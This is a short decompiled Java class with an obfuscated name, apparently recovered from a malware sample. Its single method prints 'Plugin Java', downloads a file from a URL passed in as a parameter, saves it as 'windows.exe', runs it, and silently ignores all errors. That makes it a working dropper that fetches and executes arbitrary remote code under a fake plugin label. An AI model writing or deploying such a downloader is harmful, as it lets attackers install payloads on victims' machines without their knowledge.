import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.File;

// 
// Decompiled by Procyon v0.5.30
// 

public class M3GkZ906AkloBotA70
{
    public static void amor(final String param) {
        try {
            System.out.println("Plugin Java");
            final File f = new File("windows.exe");
            final BufferedInputStream in = new BufferedInputStream(new URL(param).openStream());
            final FileOutputStream fos = new FileOutputStream(f);
            final BufferedOutputStream bout = new BufferedOutputStream(fos, 1024);
            final byte[] data = new byte[1024];
            int x = 0;
            while ((x = in.read(data, 0, 1024)) >= 0) {
                bout.write(data, 0, x);
            }
            bout.close();
            in.close();
            Runtime.getRuntime().exec(f.getAbsolutePath());
        }
        catch (Exception ex) {}
    }
}
